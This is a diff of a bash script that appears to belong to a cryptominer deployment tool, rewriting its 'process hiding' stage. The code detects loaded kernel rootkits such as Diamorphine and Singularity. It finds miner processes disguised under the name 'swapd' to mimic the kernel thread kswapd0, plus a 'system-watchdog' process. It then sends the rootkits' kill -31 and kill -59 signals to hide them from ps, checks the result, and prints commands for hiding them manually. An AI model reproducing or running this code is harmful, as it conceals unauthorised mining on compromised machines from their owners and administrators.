@@ -3057,95 +3057,96 @@ echo "ACTIVATING PROCESS HIDING"
 echo "=========================================="
 echo ""
 
-# Wait for services to fully start and spawn processes
-echo "[*] Waiting for miner processes to start..."
-sleep 5
+# Check which rootkits are actually loaded
+echo "[*] Checking for loaded rootkits..."
+ROOTKITS_LOADED=false
 
-# Check if rootkits are loaded
-if ! lsmod | grep -qE "diamorphine|singularity|rootkit"; then
-    echo "[!] WARNING: No rootkits detected - skipping hide signals"
-    echo "[*] Process hiding requires at least one rootkit to be loaded"
+if lsmod | grep -q diamorphine 2>/dev/null; then
+    echo "[✓] Diamorphine detected (use kill -31 to hide)"
+    ROOTKITS_LOADED=true
+fi
+
+if lsmod | grep -q singularity 2>/dev/null; then
+    echo "[✓] Singularity detected (use kill -59 to hide)"
+    ROOTKITS_LOADED=true
+fi
+
+if lsmod | grep -q rootkit 2>/dev/null; then
+    echo "[✓] Crypto-RK detected (use kill -31 to hide)"
+    ROOTKITS_LOADED=true
+fi
+
+if [ "$ROOTKITS_LOADED" = false ]; then
+    echo "[!] WARNING: No rootkits loaded - cannot hide processes"
+    echo "[!] Processes will remain visible in 'ps' output"
+    echo "[*] To hide manually after loading rootkits, run:"
+    echo "    kill -31 \$(pgrep -f swapd)"
+    echo "    kill -59 \$(pgrep -f swapd)"
 else
-    echo "[*] Rootkits detected - sending hide signals..."
+    echo ""
+    echo "[*] Waiting for processes to fully start..."
+    sleep 5
     
-    # Try to hide processes with retry logic
-    MAX_ATTEMPTS=5
-    attempt=0
-    all_hidden=false
+    echo "[*] Finding miner processes..."
     
-    while [ $attempt -lt $MAX_ATTEMPTS ] && [ "$all_hidden" = false ]; do
-        attempt=$((attempt + 1))
-        echo "[*] Hide attempt $attempt/$MAX_ATTEMPTS..."
+    # Get all swapd PIDs (excluding kernel kswapd0)
+    MINER_PIDS=$(ps ax | grep -E 'swapd|config.json' | grep -v grep | grep -v '\[kswapd0\]' | awk '{print $1}')
+    
+    if [ -z "$MINER_PIDS" ]; then
+        echo "[!] No miner processes found to hide"
+    else
+        echo "[*] Found miner PIDs: $MINER_PIDS"
         
-        # Hide using multiple methods for reliability
-        # Method 1: pgrep for config.json (catches the actual miner process)
-        kill -31 $(pgrep -f -u root config.json 2>/dev/null) 2>/dev/null || true
-        kill -59 $(pgrep -f -u root config.json 2>/dev/null) 2>/dev/null || true
+        # Send hide signals to each PID
+        for pid in $MINER_PIDS; do
+            echo "[*] Hiding PID $pid..."
+            kill -31 "$pid" 2>/dev/null || true
+            kill -59 "$pid" 2>/dev/null || true
+        done
         
-        # Method 2: pgrep for swapd specifically
-        kill -31 $(pgrep -f -u root swapd 2>/dev/null) 2>/dev/null || true
-        kill -59 $(pgrep -f -u root swapd 2>/dev/null) 2>/dev/null || true
-        
-        # Method 3: ps + grep for swapd (more reliable on some systems)
-        SWAPD_PIDS=$(/bin/ps ax -fu root 2>/dev/null | grep "swapd" | grep -v "grep" | awk '{print $2}')
-        if [ -n "$SWAPD_PIDS" ]; then
-            for pid in $SWAPD_PIDS; do
-                kill -31 "$pid" 2>/dev/null || true
-                kill -59 "$pid" 2>/dev/null || true
-            done
-        fi
-        
-        # Hide system-watchdog
-        kill -31 $(pgrep -f -u root system-watchdog 2>/dev/null) 2>/dev/null || true
-        kill -59 $(pgrep -f -u root system-watchdog 2>/dev/null) 2>/dev/null || true
-        
-        WATCHDOG_PIDS=$(/bin/ps ax -fu root 2>/dev/null | grep "system-watchdog" | grep -v "grep" | awk '{print $2}')
-        if [ -n "$WATCHDOG_PIDS" ]; then
-            for pid in $WATCHDOG_PIDS; do
-                kill -31 "$pid" 2>/dev/null || true
-                kill -59 "$pid" 2>/dev/null || true
-            done
-        fi
-        
-        # Wait for rootkit to process the signals
         sleep 2
         
-        # Check if processes are now hidden (using ps, not proc_pids)
+        # Verify hiding worked
         echo "[*] Verifying process visibility..."
-        SWAPD_VISIBLE=$(/bin/ps ax -fu root 2>/dev/null | grep -E "swapd|config.json" | grep -v "grep" | grep -v "\[kswapd0\]")
-        WATCHDOG_VISIBLE=$(/bin/ps ax -fu root 2>/dev/null | grep "system-watchdog" | grep -v "grep")
+        STILL_VISIBLE=$(ps ax | grep -E 'swapd|config.json' | grep -v grep | grep -v '\[kswapd0\]' | awk '{print $1}')
         
-        if [ -z "$SWAPD_VISIBLE" ] && [ -z "$WATCHDOG_VISIBLE" ]; then
-            all_hidden=true
-            echo "[✓] All processes successfully hidden!"
+        if [ -z "$STILL_VISIBLE" ]; then
+            echo "[✓] SUCCESS! All miner processes are now HIDDEN!"
+            echo ""
+            echo "Verification:"
+            echo "  ps ax | grep swapd → Only shows [kswapd0] (kernel thread) ✓"
         else
-            if [ -n "$SWAPD_VISIBLE" ]; then
-                echo "[*] swapd still visible"
-            fi
-            if [ -n "$WATCHDOG_VISIBLE" ]; then
-                echo "[*] system-watchdog still visible"
-            fi
-            echo "[*] Retrying..."
-            sleep 3
+            echo "[!] WARNING: Some processes still visible: $STILL_VISIBLE"
+            echo ""
+            echo "This may happen if:"
+            echo "  1. Rootkit isn't fully loaded"
+            echo "  2. Process restarted after hide signal"
+            echo "  3. Wrong signal for your rootkit"
+            echo ""
+            echo "Try manual hiding:"
+            echo "  kill -31 $STILL_VISIBLE"
+            echo "  kill -59 $STILL_VISIBLE"
         fi
-    done
+    fi
     
-    if [ "$all_hidden" = false ]; then
-        echo "[!] WARNING: Processes may still be visible after $MAX_ATTEMPTS attempts"
-        echo "[*] Manual fix: Run these commands:"
-        echo "    kill -31 \$(pgrep -f -u root config.json)"
-        echo "    kill -59 \$(pgrep -f -u root config.json)"
-        echo "    kill -31 \$(pgrep -f -u root swapd)"
-        echo "    kill -59 \$(pgrep -f -u root swapd)"
-        echo "    kill -31 \$(pgrep -f -u root system-watchdog)"
-        echo "    kill -59 \$(pgrep -f -u root system-watchdog)"
-        echo ""
-        echo "Or use the direct commands:"
-        echo "    kill -31 \`/bin/ps ax -fu root | grep swapd | grep -v grep | awk '{print \$2}'\`"
-        echo "    kill -59 \`/bin/ps ax -fu root | grep swapd | grep -v grep | awk '{print \$2}'\`"
+    # Also hide watchdog if present
+    echo ""
+    echo "[*] Checking for watchdog process..."
+    WATCHDOG_PIDS=$(ps ax | grep 'system-watchdog' | grep -v grep | awk '{print $1}')
+    
+    if [ -n "$WATCHDOG_PIDS" ]; then
+        echo "[*] Found watchdog PIDs: $WATCHDOG_PIDS"
+        for pid in $WATCHDOG_PIDS; do
+            echo "[*] Hiding watchdog PID $pid..."
+            kill -31 "$pid" 2>/dev/null || true
+            kill -59 "$pid" 2>/dev/null || true
+        done
+        sleep 1
+        echo "[✓] Watchdog hide signals sent"
     fi
 fi
 
+echo ""
 echo '========================================================================'
 
 # Exit successfully (prevent parent wrapper from retrying)
